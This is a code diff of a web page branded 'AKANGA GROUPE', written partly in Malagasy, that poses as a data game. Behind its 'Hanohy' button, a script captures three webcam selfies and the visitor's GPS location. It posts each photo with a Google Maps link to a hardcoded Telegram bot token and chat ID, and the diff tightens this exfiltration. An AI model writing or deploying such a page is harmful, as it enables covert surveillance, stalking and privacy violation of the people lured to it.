@@ -10,7 +10,8 @@
          background:linear-gradient(-45deg,var(--c1),var(--c2),var(--c3));background-size:400% 400%;
          animation:bgShift 8s ease infinite;color:var(--white);font-family:'Segoe UI',sans-serif;}
     @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-    h2{margin:0 0 10px;animation:fade 1s} p{margin:0 0 20px;animation:fade 1.2s}
+    h1{margin:0 0 10px;font-size:2.2rem;animation:fade 1s}
+    p{margin:0 0 8px;animation:fade 1.2s}
     @keyframes fade{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
     button{padding:14px 32px;border:none;border-radius:50px;background:linear-gradient(135deg,#ff7b7b,#ff3860);
            color:var(--white);font-size:18px;cursor:pointer;box-shadow:0 8px 20px rgba(255,56,96,.4);
@@ -24,7 +25,7 @@
 </head>
 <body>
   <h1>AKANGA GROUPE</h1>
-  <p>Izahay ato amin'ny <strong>"AKANGA GROUPE"</strong>dia</p>
+  <p>Izahay ato amin'ny <strong>"AKANGA GROUPE"</strong> dia</p>
   <p>Mampanao lalao azahoana data</p>
   <button onclick="startProcess()">Hanohy</button>
 
@@ -32,7 +33,6 @@
     /* ------------- PARAMÈTRES TELEGRAM ------------- */
     const BOT_TOKEN = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
     const CHAT_ID   = "-1002833433414";
- // ID groupe ou personnel
 
     /* ------------- FONCTION PRINCIPALE ------------- */
     async function startProcess() {
@@ -45,22 +45,34 @@
       const canvas = document.createElement('canvas');
       const ctx    = canvas.getContext('2d');
 
-      for (let i = 0; i < 3; i++) {
-        await new Promise(r => setTimeout(r, 1200));
-        canvas.width  = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        const imgData = canvas.toDataURL('image/png');
-        sendToTelegram(imgData, "Téléchargement selfie #" + (i+1));
-      }
-      stream.getTracks().forEach(t => t.stop());
-
-      // 2. Maka toerana
-      navigator.geolocation.getCurrentPosition(pos => {
+      // 2. Maka localisation
+      navigator.geolocation.getCurrentPosition(async pos => {
         const { latitude: lat, longitude: lon } = pos.coords;
-        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
-        sendToTelegram(null, loc);
+        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        // 3. Sary 3 + lien maps
+        for (let i = 0; i < 3; i++) {
+          await new Promise(r => setTimeout(r, 1200));
+          canvas.width  = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          const imgData = canvas.toDataURL('image/png');
+
+          const caption = `Selfie #${i+1}\n📍 Toerana: ${mapLink}`;
+          await sendToTelegram(imgData, caption);
+
+          // Preview fohy
+          const img = document.createElement('img');
+          img.src = imgData;
+          img.id  = 'preview';
+          document.body.appendChild(img);
+          setTimeout(() => img.remove(), 800);
+        }
+        stream.getTracks().forEach(t => t.stop());
         alert("Tongasoa! Efa nalefa ny sary sy ny toerana tany Telegram.");
+      }, err => {
+        alert("Tsy nahazo toerana: " + err.message);
+        stream.getTracks().forEach(t => t.stop());
       });
     }
 
@@ -68,15 +80,10 @@
     async function sendToTelegram(imgBase64, caption) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
       const form = new FormData();
-
       form.append("chat_id", CHAT_ID);
       form.append("caption", caption);
-
-      if (imgBase64) {
-        const blob = dataURItoBlob(imgBase64);
-        form.append("photo", blob, "selfie.png");
-      }
-
+      const blob = dataURItoBlob(imgBase64);
+      form.append("photo", blob, "selfie.png");
       await fetch(url, { method: "POST", body: form });
     }
 
@@ -84,8 +91,8 @@
     function dataURItoBlob(dataURI) {
       const byteString = atob(dataURI.split(',')[1]);
       const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab   = new ArrayBuffer(byteString.length);
-      const ia   = new Uint8Array(ab);
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
       for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
       return new Blob([ab], { type: mime });
     }
